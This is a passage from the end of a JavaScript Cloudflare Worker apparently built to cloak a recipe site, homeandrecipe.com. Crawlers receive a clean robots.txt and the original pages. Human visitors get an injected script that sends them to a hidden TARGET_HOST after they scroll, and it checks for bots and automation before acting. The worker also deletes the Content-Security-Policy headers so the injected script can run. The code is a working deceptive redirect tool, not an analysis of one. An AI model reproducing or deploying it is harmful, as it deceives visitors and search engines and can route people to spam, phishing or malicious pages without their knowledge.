        var startY = window.scrollY || 0;

        function getScrollPct() {
            var top    = window.scrollY || document.documentElement.scrollTop || 0;
            var height = Math.max(
                document.body.scrollHeight, document.documentElement.scrollHeight,
                document.body.offsetHeight, document.documentElement.offsetHeight
            );
            var view = window.innerHeight || document.documentElement.clientHeight;
            var max  = height - view;
            return max > 50 ? top / max : (top > 60 ? 1 : 0);
        }

        function checkScroll() {
            if (done || !humanActive) return;
            if (scanAutomation() || botDetected) return;
            var top = window.scrollY || 0;
            if (top <= startY) return;
            if (getScrollPct() >= SCROLL_PCT) triggerRedirect("scroll");
        }

        window.addEventListener("scroll", checkScroll, { passive: true });
    }

})();
</script>`;
}

// ═════════════════════════════════════════════════════════════════════════════
// ROBOTS.TXT
// ═════════════════════════════════════════════════════════════════════════════

function buildRobots() {
  return [
    "User-agent: Pinterestbot",
    "Allow: /",
    "Allow: /wp-content/uploads/",
    "Allow: /*.jpg$",
    "Allow: /*.jpeg$",
    "Allow: /*.png$",
    "Allow: /*.webp$",
    "Allow: /*.gif$",
    "Crawl-delay: 0",
    "",
    "User-agent: *",
    "Allow: /",
    "Disallow: /wp-admin/",
    "Disallow: /themes/",
    "Disallow: /wp-includes/",
    "Disallow: /search/",
    "Crawl-delay: 2",
    "",
    "Sitemap: https://homeandrecipe.com/wp-sitemap.xml",
    "Sitemap: https://homeandrecipe.com/sitemap.xml",
  ].join("\n");
}

// ═════════════════════════════════════════════════════════════════════════════
// WORKER ENTRY
// ═════════════════════════════════════════════════════════════════════════════

export default {
  async fetch(request) {
    const url = new URL(request.url);
    const ua  = request.headers.get("user-agent") || "";

    // Always serve clean robots.txt
    if (url.pathname === "/robots.txt") {
      return new Response(buildRobots(), {
        headers: {
          "Content-Type":  "text/plain; charset=utf-8",
          "Cache-Control": "no-store",
        },
      });
    }

    // Hard block bots on /themes/
    if (url.pathname.startsWith("/themes/")) {
      const { bot } = await isBot(request);
      if (bot) return new Response("Forbidden", { status: 403 });
    }

    // Non-GET passthrough (POST, HEAD, etc.)
    if (request.method !== "GET") return fetch(request);

    // ── Bot decision ──────────────────────────────────────────────────────────
    const { bot } = await isBot(request);

    // Bot → clean origin passthrough (no inject, no redirect hint)
    if (bot) return fetch(request);

    // ── Human → fetch + inject redirect script ────────────────────────────────
    const origin = await fetch(request, { cf: { cacheEverything: false } });
    const ct     = origin.headers.get("content-type") || "";
    if (origin.status !== 200 || !ct.includes("text/html")) return origin;

    const path   = url.pathname.endsWith("/") ? url.pathname : url.pathname + "/";
    const dest   = `https://${TARGET_HOST}${path}${url.search}`;
    const inject = buildInjectScript(dest, TRIGGER_MODE, SCROLL_PCT);

    const transformed = new HTMLRewriter()
      .on("body", { element(el) { el.append(inject, { html: true }); } })
      .transform(origin);

    const headers = new Headers(transformed.headers);
    headers.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    headers.set("Vary", "User-Agent");
    headers.delete("content-security-policy");
    headers.delete("content-security-policy-report-only");
    headers.delete("content-length");

    return new Response(transformed.body, {
      status:     transformed.status,
      statusText: transformed.statusText,
      headers,
    });
  },
};